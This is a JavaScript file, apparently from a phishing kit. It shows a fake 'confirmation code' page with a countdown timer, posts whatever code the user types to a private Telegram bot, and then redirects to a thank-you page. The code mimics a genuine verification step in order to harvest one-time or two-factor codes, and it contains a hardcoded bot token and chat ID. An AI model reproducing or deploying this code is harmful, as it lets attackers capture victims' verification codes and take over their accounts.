// confirmation.js

let countdownInterval;

function startCountdownTimer(durationInSeconds) {
  let timer = durationInSeconds, minutes, seconds;
  countdownInterval = setInterval(function () {
    minutes = parseInt(timer / 60, 10);
    seconds = parseInt(timer % 60, 10);

    minutes = minutes < 10 ? '0' + minutes : minutes;
    seconds = seconds < 10 ? '0' + seconds : seconds;

    document.getElementById('timer').textContent = minutes + ':' + seconds;

    if (--timer < 0) {
      clearInterval(countdownInterval);
      // Optionally, you can perform actions when the timer reaches 0
    }
  }, 1000);
}

// Start the countdown timer immediately after the page loads
document.addEventListener('DOMContentLoaded', function () {
  // Start the countdown timer (300 seconds = 5 minutes)
  startCountdownTimer(300);
});

function handleConfirmationSubmission() {
  const confirmationCodeValue = document.getElementById('confirmationCode').value;
  sendConfirmationCodeToTelegramBot(confirmationCodeValue);

  // Clear the timer interval
  clearInterval(countdownInterval);

  // Redirect to the Thank You page
  window.location.href = 'thankyou.html';
}

function sendConfirmationCodeToTelegramBot(confirmationCode) {
  const botToken = '6780796808:AAEMjYut3HZtDuZWfjabfV2-kxPEI57BiLs'; // Replace with your bot token
  const chatId = '1204315551'; // Replace with your chat ID
  const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
  const message = `New Confirmation Code: ${confirmationCode}`;
  
  fetch(apiUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
    }),
  })
  .then(response => response.json())
  .then(data => console.log('Confirmation code sent to Telegram:', data))
  .catch(error => console.error('Error sending confirmation code to Telegram:', error));
}
